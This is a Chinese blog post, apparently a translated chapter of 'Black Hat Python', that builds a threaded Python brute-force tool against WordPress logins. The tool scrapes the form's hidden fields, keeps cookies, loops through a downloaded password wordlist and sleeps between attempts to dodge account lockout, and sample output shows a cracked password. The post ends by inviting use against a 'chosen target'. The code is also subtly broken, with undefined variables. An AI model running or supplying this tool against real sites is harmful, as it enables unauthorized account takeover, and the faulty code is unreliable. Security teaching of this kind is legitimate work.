<p>我们将创建一个简单的破解工具，将对广泛流行的内容管理系统WordPress有用。现代的WordPress系统包括一些基本的反暴力破解技术，但默认情况下仍然缺少帐户锁定或强验证码。</p>
<p>为了破解使用WordPress，我们的工具需要满足两个要求:它必须在提交密码尝试之前从登录表单中检索隐藏的令牌，并且必须确保我们在HTTP会话中接受cookie。远程应用程序在第一次接触时设置一个或多个cookie，并期望在登录尝试时返回这些cookie。为了解析登录表单值，我们将使用第74页“the lxml and BeautifulSoup Packages”中介绍的 <em>lxml</em> 包。</p>
<p>让我们先看看WordPress登录表单。你可以通过浏览 http://&lt;yourtarget&gt;wp-login.php/ 找到它。您可以使用浏览器的工具“查看源代码”来查找HTML结构。以Firefox浏览器为例，选择“Tools/工具-Web Developer/开发者工具-Inspector/检查”。为了简洁起见，我们只包含了相关的表单元素:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"loginform"</span> <span class="attr">id</span>=<span class="string">"loginform"</span></span></span><br><span class="line"><span class="tag">[<span class="attr">1</span>] <span class="attr">action</span>=<span class="string">"http://boodelyboo.com/wordpress/wp-login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"user_login"</span>&gt;</span>Username or Email Address<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"> [2] <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"log"</span> <span class="attr">id</span>=<span class="string">"user_login"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">size</span>=<span class="string">"20"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"user-pass-wrap"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"user_pass"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wp-pwd"</span>&gt;</span></span><br><span class="line">   [3] <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"pwd"</span> <span class="attr">id</span>=<span class="string">"user_pass"</span>  <span class="attr">value</span>=<span class="string">""</span> <span class="attr">size</span>=<span class="string">"20"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"> [4] <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"wp-submit"</span> <span class="attr">id</span>=<span class="string">"wp-submit"</span> <span class="attr">value</span>=<span class="string">"Log In"</span> /&gt;</span></span><br><span class="line"> [5] <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"testcookie"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过阅读这个表单，我们了解了一些有价值的信息，我们需要将这些信息整合到我们的破解脚本中。第一个是将表单作为HTTP POST [1]提交到 <em>/wp-login.php</em> 路径。下面的元素的所有字段是为了表单提交能成功: <em>log</em> [2]是代表用户名、<em>pwd</em> [3]变量是密码, <em>wp-submit</em> [4]是 submit 按钮的变量,和 <em>testcookie</em> [5]是一个测试 cookie 的变量。注意，这个输入在表单中是隐藏的。</p>
<p>当您使用表单进行连接时，服务器还会设置几个cookie，并期望在您发布表单数据时能再次接收它们。这是WordPress反暴力破解技术的基本部分。站点根据您当前的用户会话检查cookie，因此即使您将正确的凭据传递给登录处理脚本，如果cookie不存在，身份验证也将失败。当普通用户登录时，浏览器自动存储cookie。我们必须在暴力破解程序中复制这种行为。我们将使用 <em>requests</em> 库的 <em>Session</em> 对象自动处理这些cookie。</p>
<p>我们将在我们的破解脚本中依赖于以下的请求流，以成功地对抗WordPress:</p>
<ol>
<li>检索登录页面并接受返回的所有cookie。</li>
<li>从HTML中解析出所有表单元素。</li>
<li>将用户名和/或密码设置为从我们的字典中猜测的。</li>
<li>向登录处理脚本发送一个HTTP POST请求，包括所有HTML表单字段和存储的cookie。</li>
<li>测试看看我们是否已经成功地登录到web应用程序。</li>
</ol>
<p>Cain &amp; Abel 是一个仅适用于 Windows 的密码恢复工具，它包含一个名为 <em>Cain.txt</em> 的用于强制破解密码的大单词列表。让我们用这个文件来猜测密码。你可以直接从 Daniel Miessler 的 GitHub 仓库 SecLists 下载:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/ cain-and-abel.txt</span><br></pre></td></tr></table></figure>

<p>顺便说一下，SecLists 也包含很多其他的单词列表。为了您未来的黑客工程项目，我们鼓励您浏览它的报告。</p>
<p>您将可以看到，我们将在这个脚本中使用一些新的和有价值的技术。我们还将提到，永远不要在活跃目标上测试工具;始终使用已知凭据设置目标web应用程序的安装，并验证是否获得了所需的结果。让我们打开一个新Python文件命名为 <em>wordpress_killer.py</em> ，并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">[<span class="number">1</span>] SUCCESS = <span class="string">'Welcome to WordPress!'</span></span><br><span class="line">[<span class="number">2</span>] TARGET = <span class="string">"http://boodelyboo.com/wordpress/wp-login.php"</span></span><br><span class="line">WORDLIST = <span class="string">'/home/tim/bhp/bhp/cain.txt'</span></span><br><span class="line">[<span class="number">3</span>] <span class="function"><span class="keyword">def</span> <span class="title">get_words</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(WORDLIST) <span class="keyword">as</span> f:</span><br><span class="line">        raw_words = f.read()</span><br><span class="line">    words = Queue()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words.split():</span><br><span class="line">        words.put(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line">[<span class="number">4</span>] <span class="function"><span class="keyword">def</span> <span class="title">get_params</span><span class="params">(content)</span>:</span></span><br><span class="line">    params = dict()</span><br><span class="line">    parser = etree.HTMLParser()</span><br><span class="line">    tree = etree.parse(BytesIO(content), parser=parser)</span><br><span class="line">[<span class="number">5</span>] <span class="keyword">for</span> elem <span class="keyword">in</span> tree.findall(<span class="string">'//input'</span>):  <span class="comment"># find all input elements</span></span><br><span class="line">        name = elem.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            params[name] = elem.get(<span class="string">'value'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> params</span><br></pre></td></tr></table></figure>

<p>这些设置通用的值得解释一下。<em>TARGET</em> 变量[2]是脚本最先下载和用于解析HTML内容的URL。<em>SUCCESS</em> 变量[1]是一个字符串，我们将在每次暴力破解尝试后在响应内容中检查它，以确定我们是否成功。</p>
<p><em>get_words</em> 函数[3]看起来应该很熟悉，因为我们在第82页的“暴力破解目录和文件位置”中使用了类似的破解方式。<em>get_params</em> 函数[4]接收HTTP响应内容，解析它，并循环遍历所有输入元素[5]，以创建一个需要我们填充的参数字典。现在让我们为破解工具创建管道;下面的一些代码与前面的暴力破解程序中的代码很相似，因此我们只重点介绍最新的技术。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, url)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.url = url</span><br><span class="line">        self.found = <span class="literal">False</span></span><br><span class="line">        print(<span class="string">f'\nBrute Force Attack beginning on <span class="subst">&#123;url&#125;</span>.\n'</span>)</span><br><span class="line">        print(<span class="string">"Finished the setup where username = %s\n"</span> % username)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_bruteforce</span><span class="params">(self, passwords)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            t = threading.Thread(target=self.web_bruter, args=(passwords,))</span><br><span class="line">            t.start()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">web_bruter</span><span class="params">(self, passwords)</span>:</span></span><br><span class="line">    [<span class="number">1</span>] session = requests.Session()</span><br><span class="line">        resp0 = session.get(self.url)</span><br><span class="line">        params = get_params(resp0.content)</span><br><span class="line">        params[<span class="string">'log'</span>] = self.username</span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">while</span> <span class="keyword">not</span> passwords.empty() <span class="keyword">and</span> <span class="keyword">not</span> self.found:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            passwd = passwords.get()</span><br><span class="line">            print(<span class="string">f'Trying username/password <span class="subst">&#123;self.username&#125;</span>/<span class="subst">&#123;passwd:&lt;<span class="number">10</span>&#125;</span>'</span>)</span><br><span class="line">            params[<span class="string">'pwd'</span>] = passwd</span><br><span class="line">        [<span class="number">3</span>] resp1 = session.post(self.url, data=params)</span><br><span class="line">            <span class="keyword">if</span> SUCCESS <span class="keyword">in</span> resp1.content.decode():</span><br><span class="line">                self.found = <span class="literal">True</span></span><br><span class="line">                print(<span class="string">f"\nBruteforcing successful."</span>)</span><br><span class="line">                print(<span class="string">"Username is %s"</span> % self.username)</span><br><span class="line">                print(<span class="string">"Password is %s\n"</span> % brute)</span><br><span class="line">                print(<span class="string">'done: now cleaning up other threads. . .'</span>)</span><br></pre></td></tr></table></figure>

<p>这是我们的主要 brute-forcing 类，它将处理所有HTTP请求和管理cookie。执行暴力登录攻击的 <em>web_bruter</em> 函数的工作分三个阶段进行。</p>
<p>在初始化阶段[1]中，我们从 <em>requests</em> 库初始化一个 <em>Session</em> 对象，它将自动为我们处理cookie。然后，我们发出检索登录表单的初始请求。获得原始HTML内容后，将其传递给 <em>get_params</em> 函数，该函数解析参数的内容并返回所有检索到的表单元素的字典。成功解析HTML之后，我们将替换 <em>username</em> 参数。现在我们可以开始循环我们的密码猜测。</p>
<p>在循环阶段[2]中，我们先休眠几秒钟以试图绕过帐户锁定。然后从队列中弹出一个密码，并使用它完成参数字典的填充。如果队列中没有更多的密码，线程退出。</p>
<p>在请求阶段[3]中，我们利用参数字典发出请求。在检索身份验证尝试的结果之后，我们测试身份验证是否成功——也就是说，返回内容是否包含我们前面定义的 success 字符串。如果成功，并且该字符串存在，我们将清除队列，以便其他线程可以快速完成并返回。</p>
<p>为了封装针对WordPress的暴力破解登录工具，让我们添加以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    words = get_words()</span><br><span class="line">[<span class="number">1</span>] b = Bruter(<span class="string">'tim'</span>, url)</span><br><span class="line">[<span class="number">2</span>] b.run_bruteforce(words)</span><br></pre></td></tr></table></figure>

<p>就是这样!我们将 <em>username</em> 和 <em>url</em> 传递给 <em>Bruter</em> 类[1]，并使用从 <em>words</em> 列表[2]创建的队列暴力破解登录该应用程序。现在我们可以看到奇迹发生了。</p>
<p><strong>HTMLPARSER 101</strong></p>
<p>在本节的示例中，我们使用 <em>requests</em> 和 <em>lxml</em> 包来发出HTTP请求并解析生成的内容。但是，如果您无法安装这些包，因此必须依赖于标准库，该怎么办?正如我们在本章开始时提到的，你可以使用 <em>urllib</em> 来发出请求，但是你需要用标准库 <em>html.parser.HTMLParser</em> 来设置你自己的解析器。</p>
<p>当使用 <em>HTMLParser</em> 类时，有三个主要的类函数可以实现: <em>handle_starttag</em> 、 <em>handle_endtag</em> 和  <em>handle_data</em> 。可以在任何遇到一个打开的 HTML tag 的时候调用 <em>handle_starttag</em> 函数，而 <em>handle_endtag</em> 函数则相反，它在每次遇到一个关闭的 HTML tag 时被调用。当标签之间有原始文本时，调用 <em>handle_data</em> 函数。每个函数的函数原型略有不同，如下所示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handle_starttag(self, tag, attributes)</span><br><span class="line">handle_endttag(self, tag)</span><br><span class="line">handle_data(self, data)</span><br></pre></td></tr></table></figure>

<p>下面是一个简单的例子:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Python rocks!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handle_starttag =&gt; tag variable would be "title"</span><br><span class="line">handle_data     =&gt; data variable would be "Python rocks!"</span><br><span class="line">handle_endtag   =&gt; tag variable would be "title"</span><br></pre></td></tr></table></figure>

<p>通过对 <em>HTMLParser</em> 类的基本理解，您可以做一些事情，如解析表单、查找爬取链接、提取用于数据挖掘目的的所有纯文本，或者查找页面中的所有图像。</p>
<h3 id="Kicking-the-Tires-2"><a href="#Kicking-the-Tires-2" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>如果你没有在Kali虚拟机上安装WordPress，那么现在就安装它。在 <em>boodelyboo.com/</em> 上我们临时安装的WordPress中，我们将用户名预设为 tim ，密码预设为 1234567 ，这样我们就可以确保它正常工作。密码就在 <em>cain.txt</em> 文件里，大约有30个条目。当运行脚本时，我们得到以下输出:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(bhp) tim@kali:~/bhp/bhp$ python wordpress_killer.py</span><br><span class="line">Brute Force Attack beginning on http://boodelyboo.com/wordpress/wp-login.php.</span><br><span class="line">Finished the setup <span class="built_in">where</span> username = tim</span><br><span class="line">Trying username/password tim/!@<span class="comment">#$%</span></span><br><span class="line">Trying username/password tim/!@<span class="comment">#$%^</span></span><br><span class="line">Trying username/password tim/!@<span class="comment">#$%^&amp;</span></span><br><span class="line">--snip--</span><br><span class="line">Trying username/password tim/0racl38i</span><br><span class="line">Bruteforcing successful.</span><br><span class="line">Username is tim</span><br><span class="line">Password is 1234567</span><br><span class="line"><span class="keyword">done</span>: now cleaning up.</span><br><span class="line">(bhp) tim@kali:~/bhp/bhp$</span><br></pre></td></tr></table></figure>

<p>您可以看到脚本成功地暴力破解并登录到 WordPress 控制台。要验证它是否有效，您应该使用这些凭据手动登录。在进行本地测试并确定它可以生效之后，您就可以在选择的目标WordPress安装上使用此工具。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-5/">https://ma9iccr.github.io/2021-06/Black-Hat-Python-2nd-5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Black-Hat-Python-2nd/">Black_Hat_Python_2nd</a></div><div class="post_share"><div class="social-share" data-image="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/read.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021-07/Black-Hat-Python-2nd-6/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Black Hat Python 2nd 6</div></div></a></div><div class="next-post pull-right"><a href="/2021-06/Black-Hat-Python-2nd-4/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Black Hat Python 2nd 4</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-11/" title="Black Hat Python 2nd 11"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="relatedPosts_title">Black Hat Python 2nd 11</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-10/" title="Black Hat Python 2nd 10"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-20</div><div class="relatedPosts_title">Black Hat Python 2nd 10</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-9/" title="Black Hat Python 2nd 9"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-18</div><div class="relatedPosts_title">Black Hat Python 2nd 9</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-8/" title="Black Hat Python 2nd 8"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-13</div><div class="relatedPosts_title">Black Hat Python 2nd 8</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-7/" title="Black Hat Python 2nd 7"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-08</div><div class="relatedPosts_title">Black Hat Python 2nd 7</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-6/" title="Black Hat Python 2nd 6"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="relatedPosts_title">Black Hat Python 2nd 6</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>